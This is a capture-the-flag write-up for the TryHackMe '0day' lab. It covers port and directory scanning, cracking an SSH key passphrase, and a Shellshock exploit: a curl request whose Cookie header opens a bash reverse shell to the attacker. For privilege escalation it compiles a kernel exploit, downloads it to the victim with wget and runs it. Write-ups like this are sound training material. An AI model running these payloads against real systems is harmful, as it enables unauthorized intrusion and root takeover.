# 0day

**Room Link:** [https://tryhackme.com/room/0day](https://tryhackme.com/room/0day)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>





This appeared to be a rabbit hole but I found a key and was able to bruteforce the password for it.

<figure><img src="../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
chmod 600 id_rsa
/opt/john/ssh2john.py id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

I found a cgi file. i tried checking if it was vulnerable to shellshock which wasn't working but it was vulnerable.&#x20;

**Kali**

```
gobuster dir -u http://$VICTIM/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,cgi
```

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

**Link:** [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

**Kali#1**

```
nc -lvnp 4242
```

**Kali #2**

```
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/$KALI/4242 0>&1' http://$VICTIM/cgi-bin/test.cgi 
```

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



## Privilege Escalation

**Victim**

```
uname -a 
```

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
searchsploit 3.13.0
searchsploit -m linux/local/37292.c
gcc 37292.c -o exploit
python2 -m SimpleHTTPServer 81
```

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

The exploit didn't work as it's complaining that it can't create dynamic library

**Victim**

```
cd /tmp/
wget http://10.10.91.55:81/exploit
chmod +x exploit
./exploit
```

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

To fix this we just had to export the binpath from the machine

**Victim**

```
export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
./exploit
```

<figure><img src="../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>



